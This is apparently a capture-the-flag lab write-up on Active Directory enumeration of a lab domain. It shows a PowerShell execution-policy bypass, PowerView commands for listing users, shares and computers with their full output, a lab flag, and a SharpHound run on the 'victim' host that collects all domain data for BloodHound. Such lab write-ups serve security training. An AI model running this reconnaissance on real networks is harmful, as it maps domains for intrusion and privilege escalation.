# [Task 2] Enumeration w/ Powerview
```
start and bypass policy
powershell -ep bypass

start powerview
PowerView.ps1

Get-NetUser | select cn
```
[Task 2] Enumeration w/ Powerview
```sh
PS C:\Users\Administrator> Invoke-ShareFinder
\\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin
\\Domain-Controller.CONTROLLER.local\C$         - Default share
\\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
\\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share
\\Domain-Controller.CONTROLLER.local\Share      -
\\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share
PS C:\Users\Administrator> Get-NetComputer -fulldata


pwdlastset                    : 5/13/2020 8:15:07 PM
logoncount                    : 57
serverreferencebl             : CN=DOMAIN-CONTROLL,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=C
                                ONTROLLER,DC=local
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DOMAIN-CONTROLL,OU=Domain Controllers,DC=CONTROLLER,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 6/1/2020 5:36:14 AM
name                          : DOMAIN-CONTROLL
objectsid                     : S-1-5-21-849420856-2351964222-986696166-1000
samaccountname                : DOMAIN-CONTROLL$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : 805306369
whenchanged                   : 6/1/2020 12:36:14 PM
accountexpires                : 9223372036854775807
countrycode                   : 0
adspath                       : LDAP://CN=DOMAIN-CONTROLL,OU=Domain Controllers,DC=CONTROLLER,DC=local
instancetype                  : 4
msdfsr-computerreferencebl    : CN=DOMAIN-CONTROLL,CN=Topology,CN=Domain System
                                Volume,CN=DFSR-GlobalSettings,CN=System,DC=CONTROLLER,DC=local
objectguid                    : de356d62-5156-4f21-98ad-eb28f347f32d
operatingsystem               : Windows Server 2019 Standard Evaluation
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=CONTROLLER,DC=local
dscorepropagationdata         : {5/14/2020 3:14:47 AM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {TERMSRV/DOMAIN-CONTROLL, TERMSRV/Domain-Controller.CONTROLLER.local,
                                Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/Domain-Controller.CONTROLLER.local,
                                ldap/Domain-Controller.CONTROLLER.local/ForestDnsZones.CONTROLLER.local...}
usncreated                    : 12293
memberof                      : {CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=CONTROLLER,DC=local, CN=Cert
                                Publishers,OU=Groups,DC=CONTROLLER,DC=local}
lastlogon                     : 6/1/2020 5:37:26 AM
badpwdcount                   : 0
cn                            : DOMAIN-CONTROLL
useraccountcontrol            : 532480
whencreated                   : 5/14/2020 3:14:46 AM
primarygroupid                : 516
iscriticalsystemobject        : True
msds-supportedencryptiontypes : 28
usnchanged                    : 32779
ridsetreferences              : CN=RID Set,CN=DOMAIN-CONTROLL,OU=Domain Controllers,DC=CONTROLLER,DC=local
dnshostname                   : Domain-Controller.CONTROLLER.local

logoncount                    : 10
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DESKTOP-2,CN=Computers,DC=CONTROLLER,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 5/14/2020 12:05:03 PM
objectsid                     : S-1-5-21-849420856-2351964222-986696166-1109
samaccountname                : DESKTOP-2$
localpolicyflags              : 0
lastlogon                     : 5/14/2020 12:32:05 PM
codepage                      : 0
samaccounttype                : 805306369
whenchanged                   : 5/14/2020 7:06:38 PM
countrycode                   : 0
cn                            : DESKTOP-2
accountexpires                : 9223372036854775807
adspath                       : LDAP://CN=DESKTOP-2,CN=Computers,DC=CONTROLLER,DC=local
instancetype                  : 4
usncreated                    : 20521
objectguid                    : 99e46c23-9ea0-44da-8d67-7396aedd6fe8
operatingsystem               : Windows 10 Enterprise Evaluation
operatingsystemversion        : 10.0 (18363)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=CONTROLLER,DC=local
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {RestrictedKrbHost/DESKTOP-2, HOST/DESKTOP-2,
                                RestrictedKrbHost/Desktop-2.CONTROLLER.local, HOST/Desktop-2.CONTROLLER.local}
ms-ds-creatorsid              : {1, 5, 0, 0...}
iscriticalsystemobject        : False
usnchanged                    : 20536
useraccountcontrol            : 4096
whencreated                   : 5/14/2020 7:05:03 PM
primarygroupid                : 515
pwdlastset                    : 5/14/2020 12:05:03 PM
msds-supportedencryptiontypes : 28
name                          : DESKTOP-2
dnshostname                   : Desktop-2.CONTROLLER.local

logoncount                    : 7
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=DESKTOP-1,CN=Computers,DC=CONTROLLER,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
lastlogontimestamp            : 5/14/2020 12:25:53 PM
objectsid                     : S-1-5-21-849420856-2351964222-986696166-1110
samaccountname                : DESKTOP-1$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : 805306369
whenchanged                   : 5/14/2020 7:26:53 PM
countrycode                   : 0
cn                            : DESKTOP-1
accountexpires                : 9223372036854775807
adspath                       : LDAP://CN=DESKTOP-1,CN=Computers,DC=CONTROLLER,DC=local
instancetype                  : 4
usncreated                    : 20549
objectguid                    : 260ac494-585f-4ae4-884e-1acf1ff7d55f
operatingsystem               : Windows 10 Enterprise Evaluation
operatingsystemversion        : 10.0 (18363)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=CONTROLLER,DC=local
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : {RestrictedKrbHost/DESKTOP-1, HOST/DESKTOP-1,
                                RestrictedKrbHost/Desktop-1.CONTROLLER.local, HOST/Desktop-1.CONTROLLER.local}
lastlogon                     : 5/14/2020 12:27:04 PM
iscriticalsystemobject        : False
usnchanged                    : 20563
useraccountcontrol            : 4096
whencreated                   : 5/14/2020 7:25:52 PM
primarygroupid                : 515
pwdlastset                    : 5/14/2020 12:25:52 PM
msds-supportedencryptiontypes : 28
name                          : DESKTOP-1
dnshostname                   : Desktop-1.CONTROLLER.local



PS C:\Users\Administrator> Get-NetComputer -fulldata | select operatingsystem

operatingsystem
---------------
Windows Server 2019 Standard Evaluation
Windows 10 Enterprise Evaluation
Windows 10 Enterprise Evaluation
PS C:\Users\Administrator> Get-NetUser

///
logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=POST{P0W3RV13W_FTW},CN=Users,DC=CONTROLLER,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : POST{P0W3RV13W_FTW}
userprincipalname     : POST@CONTROLLER.local
name                  : POST{P0W3RV13W_FTW}
objectsid             : S-1-5-21-849420856-2351964222-986696166-1108
samaccountname        : POST
codepage              : 0
samaccounttype        : 805306368
whenchanged           : 5/14/2020 3:42:38 AM
accountexpires        : 9223372036854775807
countrycode           : 0
adspath               : LDAP://CN=POST{P0W3RV13W_FTW},CN=Users,DC=CONTROLLER,DC=local
instancetype          : 4
usncreated            : 12884
objectguid            : 090f9517-49d7-43f1-a051-9aaa5ed2088f
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=CONTROLLER,DC=local
dscorepropagationdata : 1/1/1601 12:00:00 AM
givenname             : POST{P0W3RV13W_FTW}
lastlogon             : 12/31/1600 4:00:00 PM
badpwdcount           : 0
cn                    : POST{P0W3RV13W_FTW}
useraccountcontrol    : 66048
whencreated           : 5/14/2020 3:42:36 AM
primarygroupid        : 513
pwdlastset            : 5/13/2020 8:42:38 PM
usnchanged            : 12889

///



PS C:\Users\Administrator> Get-NetUser |select cn

cn
--
Administrator
Guest
krbtgt
Machine-1
Admin2
Machine-2
SQL Service
POST{P0W3RV13W_FTW}
sshd


PS C:\Users\Administrator>


```

# [Task 3] Enumeration w/ Bloodhound
- attack
```
root@kali:~# apt-get install bloodhound

root@kali:~# neo4j console
Active database: graph.db
Directories in use:
  home:         /usr/share/neo4j
  config:       /usr/share/neo4j/conf
  logs:         /usr/share/neo4j/logs
  plugins:      /usr/share/neo4j/plugins
  import:       /usr/share/neo4j/import
  data:         /usr/share/neo4j/data
  certificates: /usr/share/neo4j/certificates
  run:          /usr/share/neo4j/run
Starting Neo4j.
WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
2020-06-01 14:17:53.168+0000 INFO  ======== Neo4j 3.5.3 ========
2020-06-01 14:17:53.201+0000 INFO  Starting...
2020-06-01 14:17:56.123+0000 INFO  Bolt enabled on 127.0.0.1:7687.
2020-06-01 14:17:57.705+0000 INFO  Started.
2020-06-01 14:17:59.194+0000 INFO  Remote interface available at http://localhost:7474/
2020-06-01 14:18:45.760+0000 WARN  The client is unauthorized due to authentication failure.
2020-06-01 14:19:40.889+0000 WARN  The client is unauthorized due to authentication failure.

access browser
http://localhost:7474/

and change password

```
- victim
```
powershell -ep bypass
. .\Downloads\SharpHound.ps1   
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```

- atack
```
bloodhound

login 
neo4j
password

```
